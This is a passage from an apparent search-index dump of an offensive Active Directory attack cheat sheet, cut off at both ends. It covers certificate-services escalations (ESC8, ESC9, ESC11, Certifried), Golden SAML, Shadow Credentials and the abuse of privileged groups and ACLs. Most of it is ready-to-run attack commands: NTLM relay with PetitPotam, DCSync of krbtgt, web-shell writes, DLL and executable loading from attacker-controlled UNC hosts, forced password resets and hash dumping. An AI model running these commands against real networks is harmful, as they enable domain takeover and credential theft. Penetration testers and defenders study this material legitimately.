/ca:SERVER\\ca-name /readonly\n# Write an aspx shell to a local web directory:\nCertify.exe writefile /ca:SERVER\\ca-name /path:C:\\Windows\\SystemData\\CES\\CA-Name\\shell.aspx /input:C:\\Local\\Path\\shell.aspx\n# Write the default asp shell to a local web directory:\nCertify.exe writefile /ca:SERVER\\ca-name /path:c:\\inetpub\\wwwroot\\shell.asp\n# Write a php shell to a remote web directory:\nCertify.exe writefile /ca:SERVER\\ca-name /path:\\\\remote.server\\share\\shell.php /input:C:\\Local\\path\\shell.php\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#esc8-ad-cs-relay-attack","title":"ESC8 - AD CS Relay Attack","text":"<p>An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller\u2019s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket.</p> <p>Require Impacket PR #1101</p> <ul> <li> <p>Version 1: NTLM Relay + Rubeus + PetitPotam   <pre><code>impacket&gt; python3 ntlmrelayx.py -t http://&lt;ca-server&gt;/certsrv/certfnsh.asp -smb2support --adcs\nimpacket&gt; python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate\n# For a member server or workstation, the template would be \"Computer\".\n# Other templates: workstation, DomainController, Machine, KerberosAuthentication\n# Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam \n# You can also use any other way to coerce the authentication like PrintSpooler via MS-RPRN\ngit clone https://github.com/topotam/PetitPotam\npython3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP\npython3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP\npython3 dementor.py &lt;listener&gt; &lt;target&gt; -u &lt;username&gt; -p &lt;password&gt; -d &lt;domain&gt;\npython3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local\n# Use the certificate with rubeus to request a TGT\nRubeus.exe asktgt /user:&lt;user&gt; /certificate:&lt;base64-certificate&gt; /ptt\nRubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt\n# Now you can use the TGT to perform a DCSync\nmimikatz&gt; lsadump::dcsync /user:krbtgt\n</code></pre></p> </li> <li> <p>Version 2: NTLM Relay + Mimikatz + Kekeo   <pre><code>impacket&gt; python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n# Mimikatz\nmimikatz&gt; misc::efs /server:dc.lab.local /connect:&lt;IP&gt; /noauth\n# Kekeo\nkekeo&gt; base64 /input:on\nkekeo&gt; tgt::ask /pfx:&lt;BASE64-CERT-FROM-NTLMRELAY&gt; /user:dc$ /domain:lab.local /ptt\n# Mimikatz\nmimikatz&gt; lsadump::dcsync /user:krbtgt\n</code></pre></p> </li> <li> <p>Version 3: Kerberos Relay   <pre><code># Setup the relay\nsudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine\n# Run mitm6\nsudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v\n</code></pre></p> </li> <li> <p>Version 4: ADCSPwn - Require <code>WebClient</code> service running on the domain controller. By default this service is not installed.   <pre><code>https://github.com/bats3c/ADCSPwn\nadcspwn.exe --adcs &lt;cs server&gt; --port [local port] --remote [computer]\nadcspwn.exe --adcs cs.pwnlab.local\nadcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001\nadcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\\Temp\\cert_b64.txt\nadcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\\mranderson --password The0nly0ne! --dc dc.pwnlab.local\n# ADCSPwn arguments\nadcs            -       This is the address of the AD CS server which authentication will be relayed to.\nsecure          -       Use HTTPS with the certificate service.\nport            -       The port ADCSPwn will listen on.\nremote          -       Remote machine to trigger authentication from.\nusername        -       Username for non-domain context.\npassword        -       Password for non-domain context.\ndc              -       Domain controller to query for Certificate Templates (LDAP).\nunc             -       Set custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam) .\noutput          -       Output path to store base64 generated crt.\n</code></pre></p> </li> <li> <p>Version 5: Certipy ESC8   <pre><code>certipy relay -ca 172.16.19.100\n</code></pre></p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#esc9-no-security-extension","title":"ESC9 - No Security Extension","text":"<p>Requirements: * <code>StrongCertificateBindingEnforcement</code> set to <code>1</code> (default) or <code>0</code> * Certificate contains the <code>CT_FLAG_NO_SECURITY_EXTENSION</code> flag in the <code>msPKI-Enrollment-Flag</code> value * Certificate specifies <code>Any Client</code> authentication EKU * <code>GenericWrite</code> over any account A to compromise any account B</p> <p>Scenario</p> <p>John@corp.local has GenericWrite over Jane@corp.local, and we want to compromise Administrator@corp.local.  Jane@corp.local is allowed to enroll in the certificate template ESC9 that specifies the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value.</p> <ul> <li>Obtain the hash of Jane with Shadow Credentials (using our GenericWrite)     <pre><code>certipy shadow auto -username John@corp.local -p Passw0rd -account Jane\n</code></pre></li> <li>Change the userPrincipalName of Jane to be Administrator.  leave the <code>@corp.local</code> part     <pre><code>certipy account update -username John@corp.local -password Passw0rd -user Jane -upn Administrator\n</code></pre></li> <li>Request the vulnerable certificate template ESC9 from Jane's account.     <pre><code>certipy req -username jane@corp.local -hashes ... -ca corp-DC-CA -template ESC9\n# userPrincipalName in the certificate is Administrator \n# the issued certificate contains no \"object SID\"\n</code></pre></li> <li>Restore userPrincipalName of Jane to Jane@corp.local.     <pre><code>certipy account update -username John@corp.local -password Passw0rd -user Jane@corp.local\n</code></pre></li> <li>Authenticate with the certificate and receive the NT hash of the Administrator@corp.local user.      <pre><code>certipy auth -pfx administrator.pfx -domain corp.local\n# Add -domain &lt;domain&gt; to your command line since there is no domain specified in the certificate.\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#esc11-relaying-ntlm-to-icpr","title":"ESC11 - Relaying NTLM to ICPR","text":"<p>Encryption is not enforced for ICPR requests and Request Disposition is set to Issue</p> <p>Requirements: * sploutchy/Certipy - Certipy fork * sploutchy/impacket - Impacket fork</p> <p>Exploitation: 1. Look for <code>Enforce Encryption for Requests: Disabled</code> in <code>certipy find -u user@dc1.lab.local -p 'REDACTED' -dc-ip 10.10.10.10 -stdout</code> output 2. Setup a relay using Impacket ntlmrelay and trigger a connection to it.     <pre><code>ntlmrelayx.py -t rpc://10.10.10.10 -rpc-mode ICPR -icpr-ca-name lab-DC-CA -smb2support\n</code></pre></p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#certifried-cve-2022-26923","title":"Certifried CVE-2022-26923","text":"<p>An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege.</p> <ul> <li>Find <code>ms-DS-MachineAccountQuota</code> <pre><code>python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 getObjectAttributes  'DC=lab,DC=local' ms-DS-MachineAccountQuota \n</code></pre></li> <li>Add a new computer in the Active Directory, by default <code>MachineAccountQuota = 10</code> <pre><code>python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 addComputer cve 'CVEPassword1234*'\ncertipy account create 'lab.local/username:Password123*@dc.lab.local' -user 'cve' -dns 'dc.lab.local'\n</code></pre></li> <li>[ALTERNATIVE] If you are <code>SYSTEM</code> and the <code>MachineAccountQuota=0</code>: Use a ticket for the current machine and reset its SPN   <pre><code>Rubeus.exe tgtdeleg\nexport KRB5CCNAME=/tmp/ws02.ccache\npython bloodyAD -d lab.local -u 'ws02$' -k --host dc.lab.local setAttribute 'CN=ws02,CN=Computers,DC=lab,DC=local' servicePrincipalName '[]'\n</code></pre></li> <li>Set the <code>dNSHostName</code> attribute to match the Domain Controller hostname   <pre><code>python bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 setAttribute 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName '[\"DC.lab.local\"]'\npython bloodyAD.py -d lab.local -u username -p 'Password123*' --host 10.10.10.10 getObjectAttributes 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName\n</code></pre></li> <li>Request a ticket   <pre><code># certipy req 'domain.local/cve$:CVEPassword1234*@ADCS_IP' -template Machine -dc-ip DC_IP -ca discovered-CA\ncertipy req 'lab.local/cve$:CVEPassword1234*@10.100.10.13' -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA\n</code></pre></li> <li>Either use the pfx or set a RBCD on your machine account to takeover the domain   <pre><code>certipy auth -pfx ./dc.pfx -dc-ip 10.10.10.10\nopenssl pkcs12 -in dc.pfx -out dc.pem -nodes\npython bloodyAD.py -d lab.local  -c \":dc.pem\" -u 'cve$' --host 10.10.10.10 setRbcd 'CVE$' 'CRASHDC$'\ngetST.py -spn LDAP/CRASHDC.lab.local -impersonate Administrator -dc-ip 10.10.10.10 'lab.local/cve$:CVEPassword1234*'   \nsecretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'lab.local/Administrator@dc.lab.local' -k -no-pass -dc-ip 10.10.10.10 -target-ip 10.10.10.10 \n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#pass-the-certificate","title":"Pass-The-Certificate","text":"<p>Pass the Certificate in order to get a TGT, this technique is used in \"UnPAC the Hash\" and \"Shadow Credential\"</p> <ul> <li>Windows   <pre><code># Information about a cert file\ncertutil -v -dump admin.pfx\n# From a Base64 PFX\nRubeus.exe asktgt /user:\"TARGET_SAMNAME\" /certificate:cert.pfx /password:\"CERTIFICATE_PASSWORD\" /domain:\"FQDN_DOMAIN\" /dc:\"DOMAIN_CONTROLLER\" /show\n# Grant DCSync rights to an user\n./PassTheCert.exe --server dc.domain.local --cert-path C:\\cert.pfx --elevate --target \"DC=domain,DC=local\" --sid &lt;user_SID&gt;\n# To restore\n./PassTheCert.exe --server dc.domain.local --cert-path C:\\cert.pfx --elevate --target \"DC=domain,DC=local\" --restore restoration_file.txt\n</code></pre></li> <li>Linux   <pre><code># Base64-encoded PFX certificate (string) (password can be set)\ngettgtpkinit.py -pfx-base64 $(cat \"PATH_TO_B64_PFX_CERT\") \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\"\n\u200b\n# PEM certificate (file) + PEM private key (file)\ngettgtpkinit.py -cert-pem \"PATH_TO_PEM_CERT\" -key-pem \"PATH_TO_PEM_KEY\" \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\"\n# PFX certificate (file) + password (string, optionnal)\ngettgtpkinit.py -cert-pfx \"PATH_TO_PFX_CERT\" -pfx-pass \"CERT_PASSWORD\" \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\"\n# Using Certipy\ncertipy auth -pfx \"PATH_TO_PFX_CERT\" -dc-ip 'dc-ip' -username 'user' -domain 'domain'\ncertipy cert -export -pfx \"PATH_TO_PFX_CERT\" -password \"CERT_PASSWORD\" -out \"unprotected.pfx\"\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#active-directory-federation-services","title":"Active Directory Federation Services","text":""},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#adfs-golden-saml","title":"ADFS - Golden SAML","text":"<p>Requirements: * ADFS service account * The private key (PFX with the decryption password)</p> <p>Exploitation: * Run mandiant/ADFSDump on AD FS server as the AD FS service account. It will query the Windows Internal Database (WID): <code>\\\\.\\pipe\\MICROSOFT##WID\\tsql\\query</code> * Convert PFX and Private Key to binary format     <pre><code># For the pfx\necho AAAAAQAAAAAEE[...]Qla6 | base64 -d &gt; EncryptedPfx.bin\n# For the private key\necho f7404c7f[...]aabd8b | xxd -r -p &gt; dkmKey.bin \n</code></pre> * Create the Golden SAML using mandiant/ADFSpoof, you might need to update the dependencies.     <pre><code>mkdir ADFSpoofTools\ncd $_\ngit clone https://github.com/dmb2168/cryptography.git\ngit clone https://github.com/mandiant/ADFSpoof.git \nvirtualenv3 venvADFSSpoof\nsource venvADFSSpoof/bin/activate\npip install lxml\npip install signxml\npip uninstall -y cryptography\ncd cryptography\npip install -e .\ncd ../ADFSpoof\npip install -r requirements.txt\npython ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.pentest.lab saml2 --endpoint https://www.contoso.com/adfs/ls\n/SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'PENTEST\\administrator' --rpidentifier Supervision --assertions '&lt;Attribute Name=\"http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname\"&gt;&lt;AttributeValue&gt;PENTEST\\administrator&lt;/AttributeValue&gt;&lt;/Attribute&gt;'\n</code></pre></p> <p>Other interesting tools to exploit AD FS:  * WhiskeySAML</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#unpac-the-hash","title":"UnPAC The Hash","text":"<p>Using the UnPAC The Hash method, you can retrieve the NT Hash for an User via its certificate.</p> <ul> <li>Windows     <pre><code># Request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC.\nRubeus.exe asktgt /getcredentials /user:\"TARGET_SAMNAME\" /certificate:\"BASE64_CERTIFICATE\" /password:\"CERTIFICATE_PASSWORD\" /domain:\"FQDN_DOMAIN\" /dc:\"DOMAIN_CONTROLLER\" /show\n</code></pre></li> <li>Linux     <pre><code># Obtain a TGT by validating a PKINIT pre-authentication\n$ gettgtpkinit.py -cert-pfx \"PATH_TO_CERTIFICATE\" -pfx-pass \"CERTIFICATE_PASSWORD\" \"FQDN_DOMAIN/TARGET_SAMNAME\" \"TGT_CCACHE_FILE\"\n# Use the session key to recover the NT hash\n$ export KRB5CCNAME=\"TGT_CCACHE_FILE\" getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#shadow-credentials","title":"Shadow Credentials","text":"<p>Add Key Credentials to the attribute <code>msDS-KeyCredentialLink</code> of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user.  When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match.</p> <p> User objects can't edit their own <code>msDS-KeyCredentialLink</code> attribute while computer objects can. Computer objects can edit their own msDS-KeyCredentialLink attribute but can only add a KeyCredential if none already exists</p> <p>Requirements: * Domain Controller on (at least) Windows Server 2016 * Domain must have Active Directory <code>Certificate Services</code> and <code>Certificate Authority</code> configured * PKINIT Kerberos authentication * An account with the delegated rights to write to the <code>msDS-KeyCredentialLink</code> attribute of the target object</p> <p>Exploitation:  - From Windows, use Whisker:   <pre><code># Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.\nWhisker.exe list /target:computername$\n# Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.\nWhisker.exe add /target:\"TARGET_SAMNAME\" /domain:\"FQDN_DOMAIN\" /dc:\"DOMAIN_CONTROLLER\" /path:\"cert.pfx\" /password:\"pfx-password\"\nWhisker.exe add /target:computername$ [/domain:constoso.local /dc:dc1.contoso.local /path:C:\\path\\to\\file.pfx /password:P@ssword1]\n# Removes a key credential from the target object specified by a DeviceID GUID.\nWhisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b\n</code></pre></p> <ul> <li>From Linux, use pyWhisker:   <pre><code># Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.\npython3 pywhisker.py -d \"domain.local\" -u \"user1\" -p \"complexpassword\" --target \"user2\" --action \"list\"\n# Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.\npywhisker.py -d \"FQDN_DOMAIN\" -u \"user1\" -p \"CERTIFICATE_PASSWORD\" --target \"TARGET_SAMNAME\" --action \"list\"\npython3 pywhisker.py -d \"domain.local\" -u \"user1\" -p \"complexpassword\" --target \"user2\" --action \"add\" --filename \"test1\"\n# Removes a key credential from the target object specified by a DeviceID GUID.\npython3 pywhisker.py -d \"domain.local\" -u \"user1\" -p \"complexpassword\" --target \"user2\" --action \"remove\" --device-id \"a8ce856e-9b58-61f9-8fd3-b079689eb46e\"\n</code></pre></li> </ul> <p>Scenario:</p> <ul> <li>Scenario 1: Shadow Credential relaying</li> <li>Trigger an NTLM authentication from <code>DC01</code> (PetitPotam)</li> <li>Relay it to <code>DC02</code> (ntlmrelayx)</li> <li>Edit <code>DC01</code>'s attribute to create a Kerberos PKINIT pre-authentication backdoor (pywhisker)</li> <li> <p>Alternatively : <code>ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'</code></p> </li> <li> <p>Scenario 2: Workstation Takeover with RBCD   <pre><code># Only for C2: Add Reverse Port Forward from 8081 to Team Server 81\n# Set up ntlmrelayx to relay authentication from target workstation to DC \nproxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --shadow-target ws2\\$ --http-port 81\n# Execute printer bug to trigger authentication from target workstation \nproxychains python3 printerbug.py ez.lab/matt:Password1\\!@ws2.ez.lab ws1@8081/file\n# Get a TGT using the newly acquired certificate via PKINIT \nproxychains python3 gettgtpkinit.py ez.lab/ws2\\$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR\n# Get a ST (service ticket) for the target account \nproxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\\\ws2\\$:ws2.ccache@dc1.ez.lab cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v\n# Utilize the ST for future activity \nexport KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache\nproxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab\n</code></pre></p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#active-directory-groups","title":"Active Directory Groups","text":""},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#dangerous-built-in-groups-usage","title":"Dangerous Built-in Groups Usage","text":"<p>If you do not want modified ACLs to be overwritten every hour, you should change ACL template on the object <code>CN=AdminSDHolder,CN=System</code> or set <code>\"dminCount</code> attribute to <code>0</code> for the required object.</p> <p>The AdminCount attribute is set to <code>1</code> automatically when a user is assigned to any privileged group, but it is never automatically unset when the user is removed from these group(s).</p> <p>Find users with <code>AdminCount=1</code>.</p> <pre><code>crackmapexec ldap 10.10.10.10 -u username -p password --admin-count\n# or\npython ldapdomaindump.py -u example.com\\john -p pass123 -d ';' 10.10.10.10\njq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json\n# or\nGet-ADUser -LDAPFilter \"(objectcategory=person)(samaccountname=*)(admincount=1)\"\nGet-ADGroup -LDAPFilter \"(objectcategory=group) (admincount=1)\"\n# or\n([adsisearcher]\"(AdminCount=1)\").findall()\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#adminsdholder-abuse","title":"AdminSDHolder Abuse","text":"<p>The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to all \"protected groups\" in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.</p> <p>If you modify the permissions of AdminSDHolder, that permission template will be pushed out to all protected accounts automatically by <code>SDProp</code> (in an hour). E.g: if someone tries to delete this user from the Domain Admins in an hour or less, the user will be back in the group.</p> <pre><code># Add a user to the AdminSDHolder group:\nAdd-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity username -Rights All -Verbose\n# Right to reset password for toto using the account titi\nAdd-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword\n# Give all rights\nAdd-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName toto -Verbose -Rights All\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#abusing-dns-admins-group","title":"Abusing DNS Admins Group","text":"<p>It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).</p> <p> Require privileges to restart the DNS service.</p> <ul> <li>Enumerate members of DNSAdmins group     <pre><code>Get-NetGroupMember -GroupName \"DNSAdmins\"\nGet-ADGroupMember -Identity DNSAdmins\n</code></pre></li> <li>Change dll loaded by the DNS service     <pre><code># with RSAT\ndnscmd &lt;servername&gt; /config /serverlevelplugindll \\\\attacker_IP\\dll\\mimilib.dll\ndnscmd 10.10.10.11 /config /serverlevelplugindll \\\\10.10.10.10\\exploit\\privesc.dll\n# with DNSServer module\n$dnsettings = Get-DnsServerSetting -ComputerName &lt;servername&gt; -Verbose -All\n$dnsettings.ServerLevelPluginDll = \"\\attacker_IP\\dll\\mimilib.dll\"\nSet-DnsServerSetting -InputObject $dnsettings -ComputerName &lt;servername&gt; -Verbose\n</code></pre></li> <li>Check the previous command success     <pre><code>Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\ -Name ServerLevelPluginDll\n</code></pre></li> <li>Restart DNS     <pre><code>sc \\\\dc01 stop dns\nsc \\\\dc01 start dns\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#abusing-schema-admins-group","title":"Abusing Schema Admins Group","text":"<p>The Schema Admins group is a security group in Microsoft Active Directory that provides its members with the ability to make changes to the schema of an Active Directory forest. The schema defines the structure of the Active Directory database, including the attributes and object classes that are used to store information about users, groups, computers, and other objects in the directory.</p>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#abusing-backup-operators-group","title":"Abusing Backup Operators Group","text":"<p>Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files. Backup Operators also can log on to and shut down the computer. This group cannot be renamed, deleted, or moved. By default, this built-in group has no members, and it can perform backup and restore operations on domain controllers.</p> <p>This groups grants the following privileges : - SeBackup privileges - SeRestore privileges</p> <ul> <li>Get members of the group:   <pre><code>PowerView&gt; Get-NetGroupMember -Identity \"Backup Operators\" -Recurse\n</code></pre></li> <li>Enable privileges using giuliano108/SeBackupPrivilege <pre><code>Import-Module .\\SeBackupPrivilegeUtils.dll\nImport-Module .\\SeBackupPrivilegeCmdLets.dll\nSet-SeBackupPrivilege\nGet-SeBackupPrivilege\n</code></pre></li> <li>Retrieve sensitive files   <pre><code>Copy-FileSeBackupPrivilege C:\\Users\\Administrator\\flag.txt C:\\Users\\Public\\flag.txt -Overwrite\n</code></pre></li> <li>Retrieve content of AutoLogon in the HKLM\\SOFTWARE hive   <pre><code>$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'dc.htb.local',[Microsoft.Win32.RegistryView]::Registry64)\n$winlogon = $reg.OpenSubKey('SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon')\n$winlogon.GetValueNames() | foreach {\"$_ : $(($winlogon).GetValue($_))\"}\n</code></pre></li> <li>Retrieve SAM,SECURITY and SYSTEM hives</li> <li>mpgn/BackupOperatorToDA: <code>.\\BackupOperatorToDA.exe -t \\\\dc1.lab.local -u user -p pass -d domain -o \\\\10.10.10.10\\SHARE\\</code></li> <li>improsec/BackupOperatorToolkit: <code>.\\BackupOperatorToolkit.exe DUMP \\\\PATH\\To\\Dump \\\\TARGET.DOMAIN.DK</code></li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#abusing-active-directory-aclsaces","title":"Abusing Active Directory ACLs/ACEs","text":"<p>Check ACL for an User with ADACLScanner.</p> <pre><code>ADACLScan.ps1 -Base \"DC=contoso;DC=com\" -Filter \"(&amp;(AdminCount=1))\" -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show\n</code></pre>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#genericall","title":"GenericAll","text":"<ul> <li>GenericAll on User : We can reset user's password without knowing the current password</li> <li> <p>GenericAll on Group : Effectively, this allows us to add ourselves (the user hacker) to the Domain Admin group : </p> <ul> <li>On Windows : <code>net group \"domain admins\" hacker /add /domain</code></li> <li>On Linux:<ul> <li>using the Samba software suite :  <code>net rpc group ADDMEM \"GROUP NAME\" UserToAdd -U 'hacker%MyPassword123' -W DOMAIN -I [DC IP]</code></li> <li>using bloodyAD:  <code>bloodyAD.py --host [DC IP] -d DOMAIN -u hacker -p MyPassword123 addObjectToGroup UserToAdd 'GROUP NAME'</code></li> </ul> </li> </ul> </li> <li> <p>GenericAll/GenericWrite : We can set a SPN on a target account, request a Service Ticket (ST), then grab its hash and kerberoast it.   <pre><code># Check for interesting permissions on accounts:\nInvoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match \"RDPUsers\"}\n# Check if current user has already an SPN setted:\nPowerView2 &gt; Get-DomainUser -Identity &lt;UserName&gt; | select serviceprincipalname\n# Force set the SPN on the account: Targeted Kerberoasting\nPowerView2 &gt; Set-DomainObject &lt;UserName&gt; -Set @{serviceprincipalname='ops/whatever1'}\nPowerView3 &gt; Set-DomainObject -Identity &lt;UserName&gt; -Set @{serviceprincipalname='any/thing'}\n# Grab the ticket\nPowerView2 &gt; $User = Get-DomainUser username \nPowerView2 &gt; $User | Get-DomainSPNTicket | fl\nPowerView2 &gt; $User | Select serviceprincipalname\n# Remove the SPN\nPowerView2 &gt; Set-DomainObject -Identity username -Clear serviceprincipalname\n</code></pre></p> </li> <li> <p>GenericAll/GenericWrite : We can change a victim's userAccountControl to not require Kerberos preauthentication, grab the user's crackable AS-REP, and then change the setting back.</p> <ul> <li>On Windows: <pre><code># Modify the userAccountControl\nPowerView2 &gt; Get-DomainUser username | ConvertFrom-UACValue\nPowerView2 &gt; Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose\n# Grab the ticket\nPowerView2 &gt; Get-DomainUser username | ConvertFrom-UACValue\nASREPRoast &gt; Get-ASREPHash -Domain domain.local -UserName username\n# Set back the userAccountControl\nPowerView2 &gt; Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose\nPowerView2 &gt; Get-DomainUser username | ConvertFrom-UACValue\n</code></pre></li> <li>On Linux: <pre><code># Modify the userAccountControl\n$ bloodyAD.py --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] setUserAccountControl [Target_User] 0x400000 True\n\n# Grab the ticket\n$ GetNPUsers.py DOMAIN/target_user -format &lt;AS_REP_responses_format [hashcat | john]&gt; -outputfile &lt;output_AS_REP_responses_file&gt;\n\n# Set back the userAccountControl\n$ bloodyAD.py --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] setUserAccountControl [Target_User] 0x400000 False\n</code></pre></li> </ul> </li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#genericwrite","title":"GenericWrite","text":"<ul> <li> <p>Reset another user's password</p> <ul> <li>On Windows:     <pre><code># https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1\n$user = 'DOMAIN\\user1'; \n$pass= ConvertTo-SecureString 'user1pwd' -AsPlainText -Force; \n$creds = New-Object System.Management.Automation.PSCredential $user, $pass;\n$newpass = ConvertTo-SecureString 'newsecretpass' -AsPlainText -Force; \nSet-DomainUserPassword -Identity 'DOMAIN\\user2' -AccountPassword $newpass -Credential $creds;\n</code></pre></li> <li>On Linux:     <pre><code># Using rpcclient from the  Samba software suite\nrpcclient -U 'attacker_user%my_password' -W DOMAIN -c \"setuserinfo2 target_user 23 target_newpwd\" # Using bloodyAD with pass-the-hash\nbloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd\n</code></pre></li> </ul> </li> <li> <p>WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : <code>Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue \"\\\\10.0.0.5\\totallyLegitScript.ps1</code></p> </li> </ul>"},{"location":"Methodology%20and%20Resources/Active%20Directory%20Attack/#genericwrite-and-remote-connection-manager","title":"GenericWrite and Remote Connection Manager","text":"<p>Now let\u2019s say you are in an Active Directory environment that still actively uses a Windows Server version that has RCM enabled, or that you are able to enable RCM on a compromised RDSH, what can we actually do ? Well each user object in Active Directory has a tab called \u2018Environment\u2019.</p> <p>This tab includes settings that, among other things, can be used to change what program is started when a user connects over the Remote Desktop Protocol (RDP) to a TS/RDSH in place of the normal graphical environment. The settings in the \u2018Starting program\u2019 field basically function like a windows shortcut, allowing you to supply either a local or remote (UNC) path to an executable which is to be started upon connecting to the remote host. During the logon process these values will be queried by the RCM process and run whatever executable is defined. - https://sensepost.com/blog/2020/ace-to-rce/</p> <p> The RCM is only active on Terminal Servers/Remote Desktop Session Hosts. The RCM has also been disabled on recent version of Windows (&gt;2016), it requires a registry change to re-enable.</p> <pre><code>$UserObject = ([ADSI](\"LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld\"))\n$UserObject.TerminalServicesInitialProgram = \"\\\\1.2.3.4\\share\\file.exe\"\n$UserObject.TerminalServicesWorkDirectory = \"C:\\\"\n$UserObject.SetInfo()\n</code></pre> <p>NOTE: To not alert the user the payload 